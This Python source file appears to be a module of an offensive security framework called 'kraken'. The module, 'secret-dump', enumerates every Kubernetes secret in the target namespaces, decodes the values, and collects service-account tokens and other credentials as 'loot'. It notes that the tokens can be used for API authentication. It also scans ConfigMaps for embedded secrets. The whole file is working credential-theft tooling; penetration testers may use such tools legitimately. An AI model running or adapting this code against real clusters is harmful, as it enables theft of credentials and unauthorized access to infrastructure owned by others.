"""Extract and decode ALL Kubernetes secrets and sensitive ConfigMaps."""

from __future__ import annotations

from typing import Any

from kraken.logger import log
from kraken.models import AttackResult, Credential, EngagementContext
from kraken.modules.base import BaseModule
from kraken.utils.helpers import b64d, k8s_connect, scan_for_secrets

try:
    from kubernetes.client.rest import ApiException
except ImportError:
    ApiException = Exception  # type: ignore[assignment,misc]


class SecretDumpModule(BaseModule):
    """Extract and decode ALL Kubernetes secrets and sensitive ConfigMaps."""

    name = "secret-dump"

    def run(self, ctx: EngagementContext, **kwargs: object) -> list[AttackResult]:
        namespace: str = str(kwargs.get("namespace", ""))

        if not ctx.k8s_core and not k8s_connect(ctx):
            return [AttackResult("secret-dump", "connect", "FAILED")]
        results: list[AttackResult] = []
        namespaces = [namespace] if namespace else ctx.loot.get("namespaces", ["default"])

        all_secrets: list[dict[str, Any]] = []
        for ns in namespaces:
            try:
                secrets = ctx.k8s_core.list_namespaced_secret(namespace=ns)
                for secret in secrets.items:
                    if not secret.data:
                        continue
                    decoded: dict[str, str] = {}
                    for k, v in secret.data.items():
                        decoded[k] = b64d(v) if v else ""
                    secret_info: dict[str, Any] = {
                        "name": secret.metadata.name,
                        "namespace": ns,
                        "type": secret.type,
                        "keys": list(decoded.keys()),
                        "data": {k: v[:200] for k, v in decoded.items()},
                    }
                    all_secrets.append(secret_info)

                    # Scan decoded values for sensitive patterns
                    for k, v in decoded.items():
                        hits = scan_for_secrets(v)
                        for hit in hits:
                            log(f"[SecretDump] {ns}/{secret.metadata.name}.{k}: {hit['type']}", "CRIT")
                            ctx.credentials.append(
                                Credential(
                                    hit["type"],
                                    {"namespace": ns, "secret": secret.metadata.name, "key": k, "value": hit["value"]},
                                    f"k8s:secret:{ns}/{secret.metadata.name}",
                                )
                            )

                    # Always store service-account tokens
                    if "token" in decoded:
                        token = decoded["token"]
                        log(f"[SecretDump] SA token: {ns}/{secret.metadata.name} | {token[:20]}...", "WARN")
                        ctx.credentials.append(
                            Credential(
                                "k8s_sa_token",
                                {"token": token, "namespace": ns},
                                f"k8s:secret:{ns}/{secret.metadata.name}",
                                "Service account token — can be used for kubectl/API auth",
                            )
                        )
            except ApiException as e:
                if e.status == 403:
                    log(f"[SecretDump] Forbidden: {ns}", "WARN")
                else:
                    log(f"[SecretDump] {ns}: {e}", "WARN")

        ctx.loot["secrets"] = all_secrets

        # Also scan ConfigMaps for secrets
        self._scan_configmaps(ctx, namespaces)

        results.append(
            AttackResult(
                "secret-dump",
                "k8s_secrets",
                "SUCCESS" if all_secrets else "PARTIAL",
                severity="CRITICAL" if ctx.credentials else "HIGH",
                data={"total_secrets": len(all_secrets), "credentials_found": len(ctx.credentials)},
                notes=f"Extracted {len(all_secrets)} secrets, {len(ctx.credentials)} credentials found",
            )
        )
        return results

    def _scan_configmaps(self, ctx: EngagementContext, namespaces: list[str]) -> list[dict[str, Any]]:
        hits: list[dict[str, Any]] = []
        for ns in namespaces:
            try:
                cms = ctx.k8s_core.list_namespaced_config_map(namespace=ns)
                for cm in cms.items:
                    for k, v in (cm.data or {}).items():
                        found = scan_for_secrets(str(v))
                        if found:
                            hits.append({"namespace": ns, "configmap": cm.metadata.name, "key": k, "findings": found})
                            log(
                                f"[SecretDump] ConfigMap secret: {ns}/{cm.metadata.name}.{k}: {found[0]['type']}",
                                "CRIT",
                            )
            except Exception:
                pass
        if hits:
            ctx.loot["configmap_secrets"] = hits
        return hits
